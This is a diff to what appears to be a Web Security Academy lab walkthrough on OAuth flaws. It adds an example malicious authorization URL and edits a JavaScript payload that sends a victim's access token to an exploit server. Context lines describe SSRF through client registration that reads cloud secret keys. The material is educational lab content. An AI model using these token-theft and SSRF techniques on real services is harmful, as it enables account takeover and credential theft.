@@ -100,6 +100,12 @@ Forward any remaining requests and observe that you are eventually redirected to
 ```
 https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
 ```
+EXAMPLE:
+
+```
+GET /auth?client_id=jh4kdzc6g2le7vrkg69wo&redirect_uri=https://oauth-0ad3003503a9516480298d5c029c00ea.oauth-server.net/auth?client_id=jh4kdzc6g2le7vrkg69wo&redirect_uri=https://0a5400a303b6517980178fbf007900ce.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a5c008c033f51b8808a8ee7011200d6.web-security-academy.net/exploit&response_type=token&nonce=1143824690&scope=openid%20profile%20email
+```
+
 11. Test that this URL works correctly by visiting it in your browser. You should be redirected to the exploit server's "Hello, world!" page, along with the access token in a URL fragment.
 12. On the exploit server, create a suitable script at ``/exploit`` that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead:
 ```
@@ -112,7 +118,7 @@ window.location = '/?'+document.location.hash.substr(1)
 ```
 <script>
     if (!document.location.hash) {
-        window.location = 'https://YOUR-LAB-AUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
     } else {
         window.location = '/?'+document.location.hash.substr(1)
     }
@@ -167,3 +173,4 @@ Content-Type: application/json
 11. Send this request and copy the new ``client_id`` from the response.
 12. Go back to the ``GET /client/CLIENT-ID/logo`` request and replace the ``client_id`` with the new one you just copied. Send this request. Observe that the response contains the sensitive metadata for the OAuth provider's cloud environment, including the secret access key.
 13. Use the "Submit solution" button to submit the access key and solve the lab.
+
